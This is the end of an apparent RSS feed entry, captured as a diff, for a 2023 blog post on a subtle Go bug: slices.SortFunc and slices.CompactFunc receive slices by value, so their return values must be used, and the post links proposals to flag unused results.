+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;unsafe&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Pointer&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;len&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;cap&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Both &lt;code&gt;slices.SortFunc&lt;/code&gt; and &lt;code&gt;slices.CompactFunc&lt;/code&gt; are taking a slice as
+parameter, and not a pointer to a slice, meaning that any changes to &lt;code&gt;len&lt;/code&gt; and
+&lt;code&gt;cap&lt;/code&gt; will be local to the function.&lt;/p&gt;
+&lt;p&gt;Anyway, There is a &lt;a href="https://github.com/golang/go/issues/20803"&gt;proposal&lt;/a&gt; to require
+return values to be explicitly used or ignored open since 2017, but it didn't
+go anywhere for now. There is also &lt;a href="https://github.com/golang/go/issues/20148"&gt;another proposal&lt;/a&gt;
+to make &lt;code&gt;go vet&lt;/code&gt; better at highlighting error mishandling, as well as &lt;a href="https://github.com/kisielk/errcheck"&gt;errcheck&lt;/a&gt;,
+but those wouldn't really help in this case.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Wed, 02 Aug 2023 13:15:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-08-02:/b/a-sneaky-golang-bug.html</guid><category>dev</category></item></channel></rss>
